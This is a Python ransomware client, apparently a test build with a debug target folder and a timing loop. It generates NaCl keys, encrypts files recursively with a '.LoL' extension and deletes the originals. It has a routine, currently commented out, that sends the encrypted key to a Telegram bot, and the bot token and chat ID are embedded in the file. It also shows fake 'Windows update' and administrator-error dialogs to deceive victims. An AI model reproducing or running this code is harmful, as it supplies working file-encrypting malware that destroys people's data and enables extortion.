import telegram, asyncio                  
from nacl.public import PrivateKey, PublicKey, Box   
import nacl, nacl.secret
from datetime import datetime             
from time import sleep               
import os, sys, ctypes, tkinter    
from tkinter import messagebox
from threading import Thread
import threading
import time
from multiprocessing import Process
from PIL import Image, ImageDraw, ImageFont
from tkinter import Label, Entry
import subprocess

fileName='./Client.py'
afterFileName='./Client_after_enc.py'

PRIVATE_KEY_RSA_FILENAME=f"KEY_FILE"
PRIVATE_KEY_RSA=0
PUBLIC_KEY_RSA=0

PRIVATE_KEY_AES_FILENAME=f"KEY_FILE2"
PRIVATE_KEY_AES=0

PUBLIC_SERVER_RSA_KEY=PublicKey(b'gmv]R[\x83z\xf9R\xd4?\xbd\x0c\xfc\x0f\xdf\n\xf6\xaa\x9f@\xf8\xb2\xfb\x05\x95\xbcO\xc3wE')

AES_BOX=0

BOT=telegram.Bot(token='6516628933:AAHr__4L6DnlSiBXptkMsKi8DhvPwanGrJQ')
CHAT_ID=5911780078

EncryptModule=0

MaxThread=120
ThreadPool=[]
IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()

PathList=[]
PathList_DEBUG=[]

def makeRSAKey():
    global PRIVATE_KEY_RSA, PUBLIC_KEY_RSA
    if os.path.isfile(PRIVATE_KEY_RSA_FILENAME):
        with open(PRIVATE_KEY_RSA_FILENAME, 'rb') as File:
            byteCode=File.read()
        PRIVATE_KEY_RSA=PrivateKey(byteCode)
        PUBLIC_KEY_RSA=PRIVATE_KEY_RSA.public_key
    else:
        PRIVATE_KEY_RSA=PrivateKey.generate()
        PUBLIC_KEY_RSA=PRIVATE_KEY_RSA.public_key
        with open(PRIVATE_KEY_RSA_FILENAME, 'wb') as File:
            File.write(PRIVATE_KEY_RSA._private_key)

def makeAESKey():
    global PRIVATE_KEY_AES
    if os.path.isfile(PRIVATE_KEY_AES_FILENAME):
        with open(PRIVATE_KEY_AES_FILENAME, 'rb') as File:
            PRIVATE_KEY_AES=File.read()
    else:
        PRIVATE_KEY_AES=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
        with open(PRIVATE_KEY_AES_FILENAME, 'wb') as File:
            File.write(PRIVATE_KEY_AES)

def encryptAES():
    global AES_BOX
    AES_BOX=Box(PRIVATE_KEY_RSA, PUBLIC_SERVER_RSA_KEY)
    encrypted_aes_key=AES_BOX.encrypt(PRIVATE_KEY_AES)
    return encrypted_aes_key

async def sendTelegram(chat_id, msg):
    await BOT.send_message(chat_id, msg)
    
def sendKeyToServer(encrypted_aes_key):
    loop = asyncio.get_event_loop() 
    loop.run_until_complete(sendTelegram(CHAT_ID, "ClientRSAPublicKey: "))
    loop = asyncio.get_event_loop() 
    loop.run_until_complete(sendTelegram(CHAT_ID, str(PUBLIC_KEY_RSA))) 
    loop = asyncio.get_event_loop()
    loop.run_until_complete(sendTelegram(CHAT_ID, "EncryptedClientAESKey: "))
    loop = asyncio.get_event_loop()  
    loop.run_until_complete(sendTelegram(CHAT_ID, str(encrypted_aes_key)))

class Encryptor:
    def __init__(self, files=0):
        self._files=files

    @classmethod
    def encEach(self, path):
        with open(path, "rb") as File:
            data=File.read()
        encryptedFile=EncryptModule.encrypt(data)
        with open(f"{path}.LoL", "wb") as File:
            File.write(encryptedFile)
        os.remove(path)

    @classmethod
    def decEach(self, path):
        originName=path.strip(".LoL")
        with open(path, "rb") as File:
            data=File.read()
        decryptedFile=EncryptModule.decrypt(data)
        with open(originName, "wb") as File:
            File.write(decryptedFile)
        os.remove(path)

    def encryptFile(self):
        try:
            for file in self._files:
                if(os.path.isfile(file)==True):
                    if(file==sys.argv[0]):
                        return
                    if(os.path.getsize(file)>500000000):
                        if (len(ThreadPool)<MaxThread):
                            th=Process(target=Encryptor.encEach, args=(file,))
                            ThreadPool.append(th)
                            th.start()
                        else:
                            self.encEach(file)
                    else :
                        self.encEach(file)
                
        except Exception as e:
            print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")
            
    def decryptFile(self):
        try:
            for file in self._files:
                if(os.path.isfile(file)==True):
                    if(file==sys.argv[0]):
                        return
                    extension=os.path.splitext(file)[-1]
                    if(extension!='.LoL'):
                        continue;
                    
                    if(os.path.getsize(file)>50000000):
                        if (len(ThreadPool)<MaxThread):
                            th=Process(target=Encryptor.decEach, args=(file,))
                            ThreadPool.append(th)
                            th.start()
                        else:
                            self.decEach(file)
                    else :
                        self.decEach(file)
        except Exception as e:
            print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")

def setEncryptModule():
    global EncryptModule
    EncryptModule=nacl.secret.SecretBox(PRIVATE_KEY_AES)

def listUpTargetDir():
    global PathList, PathList_DEBUG
    #PathList=[r"C:\Users\\"]
    #for letter in range(97, 123):
    #    drive=f"{chr(letter)}:\\"
    #    if (pathlib.Path(drive).exists()):
    #        PathList.append(drive)
    #PathList.remove("c:\\")
    #print(f"[DEBUG] PathList: {PathList}")
    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\molly"]

def recursiveEncrypt(basepath):
    global ThreadPool
    files=[]
    dirs=[]
    for entry in os.listdir(basepath):
        absolutePath=os.path.join(basepath, entry)
        if os.path.isfile(absolutePath):
            files.append(absolutePath)
        elif os.path.isdir(absolutePath):
            dirs.append(absolutePath)

    if (len(files)>0):
        Encryptor(files).encryptFile()
    for dir in dirs:
        recursiveEncrypt(dir)

def recursiveDecrypt(basepath):
    files=[]
    dirs=[]
    for entry in os.listdir(basepath):
        absolutePath=os.path.join(basepath, entry)
        if os.path.isfile(absolutePath):
            files.append(absolutePath)
        elif os.path.isdir(absolutePath):
            dirs.append(absolutePath)

    if (len(files)>0):
        Encryptor(files).decryptFile()
    for dir in dirs:
        recursiveDecrypt(dir)

#기타 함수
def fakeAdmin():
    WINDOW=tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("Error", "Try to re-run as administrator")

def fakeAlert():
    WINDOW=tkinter.Tk()
    WINDOW.withdraw()
    messagebox.showerror("Windows 업데이트 작업 중...", "컴퓨터를 끄지 마십시오")
            
if __name__=='__main__':
    makeRSAKey()
    makeAESKey()
    encrypted_aes_key=encryptAES()
    #sendKeyToServer(encrypted_aes_key)
    setEncryptModule()
    listUpTargetDir()
    t=Thread(target=fakeAlert)
    t.start()
    enc_time=[]
    dec_time=[]
    total_time=[]

    if(IsAdmin==True):
        task_thread = threading.Thread(target=fakeAlert)
        for i in range(10):
            print("암호화 시작 %d/5"%(i+1))
            start=time.time()
            for drive in PathList_DEBUG:
                start=time.time()
                recursiveEncrypt(drive)
                end=time.time()
                while (len(ThreadPool)!=0):
                    th=ThreadPool.pop()
                    th.join()
            end=time.time()
            print("암호화 완료: %2.2f"  %(end-start))
            enc_time.append(end-start)
            start=time.time()
            for drive in PathList_DEBUG:
                start=time.time()
                recursiveDecrypt(drive)
                end=time.time()
                while (len(ThreadPool)!=0):
                    th=ThreadPool.pop()
                    th.join()
            end=time.time()
            print("복호화 완료: %2.2f"  %(end-start))
            dec_time.append(end-start)
            total_time.append(dec_time[i]+enc_time[i])
    else:
        fakeAdmin()
    print("완료")
    total_time.sort()
    print(total_time)
    print("mid %2.2f" %(total_time[4]))
    #os.system(afterFileName)
    #os.remove(fileName)
